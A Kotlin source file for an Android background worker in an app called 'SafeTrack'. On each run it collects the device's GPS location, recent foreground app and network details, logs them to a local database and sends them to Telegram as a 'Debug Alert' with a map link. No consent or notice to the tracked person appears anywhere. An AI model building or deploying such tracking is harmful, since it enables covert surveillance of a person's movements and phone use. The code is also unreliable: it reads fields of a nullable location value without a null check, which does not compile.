package com.example.safetrack

import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import java.text.SimpleDateFormat
import java.util.Locale

class TrackingWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        Log.d("TrackingWorker", "Background Tracking Started")

        // 1. Fetch current location
        var latLon: Pair<Double, Double>? = null
        var locationText = ""
        try {
            latLon = LocationTracker.getCurrentLocation(applicationContext)
            if (latLon == null) {
                locationText = "GPS is OFF or Unavailable"
            } else {
                locationText = "${latLon.first}, ${latLon.second}"
            }
        } catch (e: Exception) {
            locationText = "GPS is OFF or Unavailable"
        }
        val finalLatLon = latLon ?: Pair(0.0, 0.0)

        // Utility: Get Home Launcher Package
        fun getHomeLauncherPackage(): String? {
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_HOME)
            val resolveInfo = applicationContext.packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY)
            return resolveInfo?.activityInfo?.packageName
        }

        // 2. Fetch precise app usage events for the last 15 minutes
        val usageStatsManager = applicationContext.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val endTime = System.currentTimeMillis()
        val startTime = endTime - 15 * 60 * 1000 // 15 minutes interval

        val usageEvents = usageStatsManager.queryEvents(startTime, endTime)
        val event = UsageEvents.Event()
        var actualForegroundApp = ""

        while (usageEvents.hasNextEvent()) {
            usageEvents.getNextEvent(event)
            if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                val pkg = event.packageName
                if (pkg != "com.google.android.googlequicksearchbox" &&
                    pkg != "com.miui.home" &&
                    !pkg.contains("launcher") &&
                    !pkg.contains("systemui")) {
                    actualForegroundApp = pkg
                }
            }
        }

        if (actualForegroundApp.isEmpty()) {
            actualForegroundApp = "None/Home Screen"
        }

        var realAppName = actualForegroundApp
        try {
            if (actualForegroundApp != "None/Home Screen") {
                val pm = applicationContext.packageManager
                val ai = pm.getApplicationInfo(actualForegroundApp, 0)
                realAppName = pm.getApplicationLabel(ai).toString()
            }
        } catch (e: Exception) {
            Log.e("TrackingWorker", "Could not get app name", e)
        }

        // 3. Insert into Room Database
        val database = AppDatabase.getDatabase(applicationContext)
        val dao = database.trackingDao()
        val log = TrackingData(
            timestamp = System.currentTimeMillis(),
            latitude = latLon.first,
            longitude = latLon.second,
            packageName = actualForegroundApp,
            foregroundTimeMs = 0, // Not available directly in Events
            lastTimeUsed = System.currentTimeMillis()
        )
        dao.insertLog(log)

        // 4. Send to Telegram
        val sdf = SimpleDateFormat("dd-MMM-yyyy hh:mm a", Locale.getDefault())
        val currentTime = sdf.format(System.currentTimeMillis())

        val mapLink = "https://maps.google.com/?q=${finalLatLon.first},${finalLatLon.second}"

        val networkData = NetworkLocationUtility.getNetworkLocationInfo(applicationContext)

        val myLog = """
            🚨 *SafeTrack Debug Alert* 🚨

            ⏱ *Time:* $currentTime

            📍 *Location:* $locationText
            🗺 *Map:* [Open Location in Google Maps]($mapLink)

            📱 *App Opened:* $realAppName
            📦 *Package:* $actualForegroundApp
            📡 *Network Info:* $networkData
        """.trimIndent()

        TelegramSyncHelper.sendDebugLog(applicationContext, finalLatLon.first.toString(), finalLatLon.second.toString(), myLog)

        return Result.success()
    }
}
